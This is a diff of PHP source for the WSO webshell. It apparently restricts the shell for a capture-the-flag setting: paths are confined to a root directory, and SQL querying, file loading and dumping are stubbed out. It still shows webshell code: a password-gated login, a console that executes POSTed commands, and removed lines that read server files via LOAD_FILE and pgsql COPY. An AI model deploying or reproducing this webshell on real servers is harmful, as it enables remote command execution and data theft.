@@ -22,7 +22,7 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @set_time_limit(0);
 if (PHP_VERSION_ID < 70000)
 	@set_magic_quotes_runtime(0);
-@define('VERSION', '4.5.0');
+@define('VERSION', '5.0.0');
 if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -47,7 +47,7 @@ function hardLogin() {
 		  exit;
 		  }
 		}
-	die("</br></br><pre align=center><form method=post class='login-panel' style='font-family:Nunito,sans-serif;text-align:center;position:relative;z-index:10;'><span class='hello-tag'>Hello</span><h3 style='margin:4px 0 14px 0;font-weight:700;'>Welcome to wso webshell v4.5.0!</h3><br><input placeholder='password' type=password name=pass class='login-pass' required><input type=submit name='watching' value='>>' class='login-btn'></form></pre>
+	die("</br></br><pre align=center><form method=post class='login-panel' style='font-family:Nunito,sans-serif;text-align:center;position:relative;z-index:10;'><span class='hello-tag'>Hello</span><h3 style='margin:4px 0 14px 0;font-weight:700;'>Welcome to wso webshell v5.0.0!</h3><br><input placeholder='password' type=password name=pass class='login-pass' required><input type=submit name='watching' value='>>' class='login-btn'></form></pre>
 <div class='bg-mesh'></div><div class='scanlines'></div><div class='particles'><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div><div class='float-shapes'><span class='orb o1'></span><span class='orb o2'></span><span class='orb o3'></span><span class='hex h1'></span><span class='hex h2'></span></div><div class='pulse-ring'></div><div class='view'><div class='plane main'><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div></div></div><div class='plane secondary'><div class='ring'></div><div class='ring'></div></div>
 <style>body,html{margin:0;background:#0a120a;overflow:hidden;width:100%;height:100%;position:absolute;min-height:100vh;}.bg-mesh{position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse 80% 60% at 20% 30%,rgba(45,143,78,.35) 0%,transparent 55%),radial-gradient(ellipse 70% 50% at 85% 70%,rgba(104,183,35,.18) 0%,transparent 50%),radial-gradient(ellipse 50% 40% at 50% 100%,rgba(26,77,46,.45) 0%,transparent 45%),linear-gradient(165deg,#0a120a 0%,#0d1a0f 45%,#0a120a 100%);animation:meshShift 18s ease-in-out infinite alternate;}.scanlines{position:fixed;inset:0;z-index:1;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(45,143,78,.04) 2px,rgba(45,143,78,.04) 4px);animation:scanMove 8s linear infinite;opacity:.7;}.particles{position:fixed;inset:0;z-index:1;pointer-events:none;}.particles i{position:absolute;width:3px;height:3px;background:#68b723;border-radius:50%;box-shadow:0 0 8px #2d8f4e;opacity:.6;animation:particleDrift 12s linear infinite;}.particles i:nth-child(1){left:8%;top:20%;animation-delay:0s;animation-duration:14s;}.particles i:nth-child(2){left:22%;top:65%;animation-delay:-2s;}.particles i:nth-child(3){left:45%;top:12%;animation-delay:-4s;width:2px;height:2px;}.particles i:nth-child(4){left:70%;top:40%;animation-delay:-1s;}.particles i:nth-child(5){left:88%;top:75%;animation-delay:-6s;}.particles i:nth-child(6){left:15%;top:88%;animation-delay:-3s;}.particles i:nth-child(7){left:55%;top:55%;animation-delay:-5s;opacity:.4;}.particles i:nth-child(8){left:92%;top:18%;animation-delay:-7s;}.particles i:nth-child(9){left:35%;top:78%;animation-delay:-2.5s;}.particles i:nth-child(10){left:62%;top:8%;animation-delay:-8s;}.particles i:nth-child(11){left:5%;top:48%;animation-delay:-4.5s;}.particles i:nth-child(12){left:78%;top:92%;animation-delay:-9s;}.float-shapes{position:fixed;inset:0;z-index:1;pointer-events:none;}.float-shapes .orb{position:absolute;border-radius:50%;border:1px solid rgba(45,143,78,.25);animation:orbFloat 22s ease-in-out infinite;}.float-shapes .o1{width:180px;height:180px;left:5%;bottom:10%;box-shadow:inset 0 0 40px rgba(45,143,78,.12),0 0 30px rgba(45,143,78,.08);animation-delay:0s;}.float-shapes .o2{width:120px;height:120px;right:8%;top:15%;border-color:rgba(104,183,35,.2);animation-delay:-7s;animation-duration:16s;}.float-shapes .o3{width:60px;height:60px;left:40%;top:25%;background:rgba(26,77,46,.4);animation-delay:-3s;animation-duration:19s;}.float-shapes .hex{position:absolute;width:40px;height:40px;border:1px solid rgba(104,183,35,.35);transform:rotate(45deg);animation:hexSpin 25s linear infinite;}.float-shapes .h1{right:25%;bottom:20%;}.float-shapes .h2{left:18%;top:35%;animation-duration:18s;animation-direction:reverse;}.pulse-ring{position:fixed;left:50%;top:50%;width:min(90vw,520px);height:min(90vw,520px);margin-left:calc(min(90vw,520px)/-2);margin-top:calc(min(90vw,520px)/-2);border-radius:50%;border:1px solid rgba(45,143,78,.15);z-index:1;pointer-events:none;animation:pulseGlow 4s ease-in-out infinite;box-shadow:0 0 80px rgba(45,143,78,.08);}.login-panel{color:#68b723;text-shadow:0 0 20px rgba(45,143,78,.35);}.login-panel .hello-tag{display:block;font-size:11px;letter-spacing:.35em;text-transform:uppercase;color:#2d8f4e;opacity:.85;margin-bottom:2px;}.login-panel h3{color:#a8e6b8;text-shadow:0 0 24px rgba(104,183,35,.4);}.login-pass{border-radius:4px 0 0 4px;background:rgba(13,26,15,.85);border:1px solid #1a4d2e;color:#a8e6b8;outline:none;padding:4px 8px;}.login-pass::placeholder{color:rgba(104,183,35,.55);}.login-btn{height:24px;border:none;border-radius:0 4px 4px 0;background:linear-gradient(180deg,#2d8f4e 0%,#1a4d2e 100%);color:#e8ffe8;cursor:pointer;padding:0 10px;box-shadow:0 0 12px rgba(45,143,78,.45);}.login-btn:hover{background:linear-gradient(180deg,#68b723 0%,#2d8f4e 100%);}.view{position:absolute;top:0;left:0;right:0;bottom:0;-webkit-perspective:400;perspective:400;z-index:2;pointer-events:none;}.plane{width:120px;height:120px;-webkit-transform-style:preserve-3d;transform-style:preserve-3d;position:absolute;z-index:2;}.plane.main{top:0;left:0;right:0;bottom:0;margin:auto;-webkit-transform:rotateX(60deg) rotateZ(-30deg);transform:rotateX(60deg) rotateZ(-30deg);-webkit-animation:rotate 20s infinite linear;animation:rotate 20s infinite linear;}.plane.secondary{top:0;left:0;right:0;bottom:0;margin:auto;width:200px;height:200px;-webkit-transform:rotateX(75deg) rotateZ(45deg);transform:rotateX(75deg) rotateZ(45deg);-webkit-animation:rotateReverse 28s infinite linear;animation:rotateReverse 28s infinite linear;opacity:.35;}.plane.secondary .ring{width:100px;height:100px;position:absolute;border:2px solid rgba(45,143,78,.4);border-radius:50%;box-shadow:0 0 40px rgba(104,183,35,.25);left:50%;top:50%;margin:-50px 0 0 -50px;}.plane.secondary .ring:nth-child(2){width:70px;height:70px;margin:-35px 0 0 -35px;border-color:rgba(104,183,35,.3);-webkit-transform:translateZ(40px);transform:translateZ(40px);}.plane.main .circle{width:120px;height:120px;position:absolute;-webkit-transform-style:preserve-3d;transform-style:preserve-3d;border-radius:100%;box-sizing:border-box;box-shadow:0 0 60px #2d8f4e,inset 0 0 60px #1a4d2e;border:1px solid rgba(104,183,35,.2);}.plane.main .circle::after,.plane.main .circle::before{content:'';display:block;position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;width:5%;height:5%;border-radius:100%;background:#2d8f4e;box-sizing:border-box;box-shadow:0 0 60px 2px #68b723;}.plane.main .circle::before{-webkit-transform:translateZ(-90px);transform:translateZ(-90px)}.plane.main .circle::after{-webkit-transform:translateZ(90px);transform:translateZ(90px)}.plane.main .circle:nth-child(1){-webkit-transform:rotateZ(72deg) rotateX(63.435deg);transform:rotateZ(72deg) rotateX(63.435deg)}.plane.main .circle:nth-child(2){-webkit-transform:rotateZ(144deg) rotateX(63.435deg);transform:rotateZ(144deg) rotateX(63.435deg)}.plane.main .circle:nth-child(3){-webkit-transform:rotateZ(216deg) rotateX(63.435deg);transform:rotateZ(216deg) rotateX(63.435deg)}.plane.main .circle:nth-child(4){-webkit-transform:rotateZ(288deg) rotateX(63.435deg);transform:rotateZ(288deg) rotateX(63.435deg)}.plane.main .circle:nth-child(5){-webkit-transform:rotateZ(360deg) rotateX(63.435deg);transform:rotateZ(360deg) rotateX(63.435deg)}@-webkit-keyframes rotate{0%{-webkit-transform:rotateX(60deg) rotateY(0) rotateZ(-30deg);transform:rotateX(60deg) rotateY(0) rotateZ(-30deg)}100%{-webkit-transform:rotateX(60deg) rotateY(360deg) rotateZ(330deg);transform:rotateX(60deg) rotateY(360deg) rotateZ(330deg)}}@keyframes rotate{0%{-webkit-transform:rotateX(60deg) rotateY(0) rotateZ(-30deg);transform:rotateX(60deg) rotateY(0) rotateZ(-30deg)}100%{-webkit-transform:rotateX(60deg) rotateY(360deg) rotateZ(330deg);transform:rotateX(60deg) rotateY(360deg) rotateZ(330deg)}}@-webkit-keyframes rotateReverse{0%{-webkit-transform:rotateX(75deg) rotateZ(45deg);transform:rotateX(75deg) rotateZ(45deg)}100%{-webkit-transform:rotateX(75deg) rotateZ(-315deg);transform:rotateX(75deg) rotateZ(-315deg)}}@keyframes rotateReverse{0%{-webkit-transform:rotateX(75deg) rotateZ(45deg);transform:rotateX(75deg) rotateZ(45deg)}100%{-webkit-transform:rotateX(75deg) rotateZ(-315deg);transform:rotateX(75deg) rotateZ(-315deg)}}@keyframes meshShift{0%{filter:hue-rotate(0deg) brightness(1)}100%{filter:hue-rotate(8deg) brightness(1.05)}}@keyframes scanMove{0%{background-position:0 0}100%{background-position:0 120px}}@keyframes particleDrift{0%{transform:translateY(0) translateX(0);opacity:0}10%{opacity:.7}90%{opacity:.5}100%{transform:translateY(-100vh) translateX(20px);opacity:0}}@keyframes orbFloat{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(25px,-30px) scale(1.05)}}@keyframes hexSpin{0%{transform:rotate(45deg) translateY(0)}50%{transform:rotate(225deg) translateY(-15px)}100%{transform:rotate(405deg) translateY(0)}}@keyframes pulseGlow{0%,100%{transform:scale(1);opacity:.4;border-color:rgba(45,143,78,.12)}50%{transform:scale(1.06);opacity:.75;border-color:rgba(104,183,35,.35);box-shadow:0 0 100px rgba(45,143,78,.18)}}</style>");
 }
@@ -60,7 +60,21 @@ if(!$safe_mode)
     error_reporting(0);
 $disable_functions = @ini_get('disable_functions');
 $home_cwd = @getcwd();
-if(isset($_POST['c']))
+$ctf_root = $home_cwd ? $home_cwd : dirname(__FILE__);
+function ctf_in_root($path) {
+	$base = @$GLOBALS['ctf_root'];
+	if(!$base) return false;
+	$rp = @realpath($path);
+	if($rp === false && @file_exists($path))
+		$rp = @realpath($GLOBALS['cwd'] . $path);
+	if($rp === false) return false;
+	$rb = @realpath($base);
+	if($rb === false) $rb = $base;
+	$rp = str_replace('\\', '/', $rp);
+	$rb = str_replace('\\', '/', $rb);
+	return ($rp === $rb || strpos($rp, $rb . '/') === 0);
+}
+if(isset($_POST['c']) && ctf_in_root($_POST['c']))
 	@chdir($_POST['c']);
 $cwd = @getcwd();
 if($os == 'win') {
@@ -420,6 +434,12 @@ function actionFilesTools() {
 	
 	hardHeader();
 	echo '<h1>File tools</h1><div class=content>';
+	$ft_path = @$GLOBALS['cwd'] . @$_POST['p1'];
+	if(@$_POST['p1'] !== '' && @$_POST['p1'] !== null && !ctf_in_root($ft_path) && !ctf_in_root(@$_POST['p1'])) {
+		echo 'File not exists';
+		hardFooter();
+		return;
+	}
 	if( !file_exists(@$_POST['p1']) ) {
 		echo 'File not exists';
 		hardFooter();
@@ -521,13 +541,7 @@ function actionFilesTools() {
 			break;
 		
 		case 'frame':
-			$frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));
-			if ($frameSrc[0] != '/')
-				$frameSrc = '/' . $frameSrc;
-			if ($frameSrc[strlen($frameSrc) - 1] != '/')
-				$frameSrc = $frameSrc . '/';
-			$frameSrc = $frameSrc . htmlspecialchars($_POST['p1']);
-			echo '<iframe width="100%" height="900px" scrolling="no" src='.$frameSrc.' onload="onload=height=contentDocument.body.scrollHeight"></iframe>';
+			echo '<p>Preview unavailable.</p>';
 			break;
 	}
 	echo '</div>';
@@ -606,12 +620,6 @@ function actionConsole() {
 		ob_start();
 		echo "d.cf.cmd.value='';\n";
 		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\'\0"));
-		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
-			if(@chdir($match[1])) {
-				$GLOBALS['cwd'] = @getcwd();
-				echo "c_='".$GLOBALS['cwd']."';";
-			}
-		}
 		echo "d.cf.output.value+='".$temp."';";
 		echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
 		$temp = ob_get_clean();
@@ -848,6 +856,8 @@ function actionStringTools() {
 			<tr><td></td><td><input type='submit' value='submit'></td></tr>
 			</table></form>";
 	function hardRecursiveGlob($path) {
+		if(!ctf_in_root($path))
+			return;
 		if(substr($path, -1) != '/')
 			$path.='/';
 		$paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR)));
@@ -959,15 +969,7 @@ function actionSql() {
 			return false;
 		}
 		function query($str) {
-			switch($this->type) {
-				case 'mysql':
-					return $this->res = @mysql_query($str);
-					break;
-				case 'pgsql':
-					return $this->res = @pg_query($this->link,$str);
-					break;
-			}
-			return false;
+			return $this->res = false;
 		}
 		function fetch() {
 			$res = func_num_args()?func_get_arg(0):$this->res;
@@ -1029,22 +1031,10 @@ function actionSql() {
 			return false;
 		}
 		function loadFile($str) {
-			switch($this->type)	{
-				case 'mysql':
-					return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
-				break;
-				case 'pgsql':
-					$this->query("CREATE TABLE hard2(file text);COPY hard2 FROM '".addslashes($str)."';select file from hard2;");
-					$r=array();
-					while($i=$this->fetch())
-						$r[] = $i['file'];
-					$this->query('drop table hard2');
-					return array('file'=>implode("\n",$r));
-				break;
-			}
-			return false;
+			return array('file' => '');
 		}
 		function dump($table, $fp = false) {
+			return false;
 			switch($this->type)	{
 				case 'mysql':
 					$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
@@ -1115,11 +1105,6 @@ function actionSql() {
             foreach($_POST['tbl'] as $v)
 				$db->dump($v);
             exit;
-        } elseif($fp = @fopen($_POST['file'], 'w')) {
-            foreach($_POST['tbl'] as $v)
-                $db->dump($v, $fp);
-            fclose($fp);
-            unset($_POST['p2']);
         } else
             die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
 	}
